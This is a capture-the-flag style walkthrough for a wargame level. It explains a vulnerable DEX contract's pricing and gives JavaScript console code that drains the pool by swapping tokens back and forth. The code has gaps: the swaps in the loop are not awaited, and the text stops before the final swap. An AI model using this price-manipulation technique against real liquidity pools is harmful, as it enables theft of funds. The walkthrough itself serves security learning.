> The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

## DEX maths

The rate of swapping between the two tokens is calculated with:

```solidity
function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
}
```

In other words, with $i$ the block number:

$$\begin{align}
\alpha_i    &= \frac{N_{t,i}}{N_{f,i}} \\
Q_{i+1}     &= \alpha_i * Q_i \\
N_{f,i+1}   &= N_{f,i} + Q_i \\
N_{t,i+1}   &= N_{t,i} - Q_{i+1}
\end{align}$$

The first rate is 1, since the amount of both tokens are equal.

Then, the pool of "from" tokens increases, and the pool of "to" tokens decreases.
Since the destination token for the next transaction switches, it means that the rate is greater than one.

Actually the rate is always greater than one and the amount of tokens increases on each round.
Until all the liquidity is swapped.

## DEXtruction

We swap the whole balance back and forth until it amount for the whole pool:

```js
// setup
tokens = [await contract.token1(), await contract.token2()]
// factor the swapping logic
async function swap(j) {
    // switch tokens every iteration
    from = tokens[j % 2];
    to = tokens[(j + 1) % 2];
    // transfer the whole balance
    amount = (await contract.balanceOf(from, player)).toNumber();
    await contract.approve(contract.address, amount);
    await contract.swap(from, to, amount);
}
// iterate
for (let i=0; i<8; i++) {
    swap(i);
}
```

This works until the player has more tokens than the pool:

> "execution reverted: ERC20: transfer amount exceeds balance"

```js
(await contract.balanceOf(tokens[0], player)).toNumber();
// 0
(await contract.balanceOf(tokens[1], player)).toNumber();
// 65
(await contract.balanceOf(tokens[0], contract.address)).toNumber();
// 110
(await contract.balanceOf(tokens[1], contract.address)).toNumber();
// 45
```

So the rate is:

$$\begin{align}
\alpha_i = \frac{110}{45} = \frac{22}{9}
\end{align}$$

We want to empty the pool, IE $Q_{i+1} = 110$.

$$\begin{align}
\alpha_i * Q_i  &= 110 \\
\rightarrow Q_i &= \frac{110}{\alpha_i} = 45
\end{align}$$

```js
from = tokens[1];
to = tokens[0];
amount = 45;
await contract.approve(contract.address, amount);
```
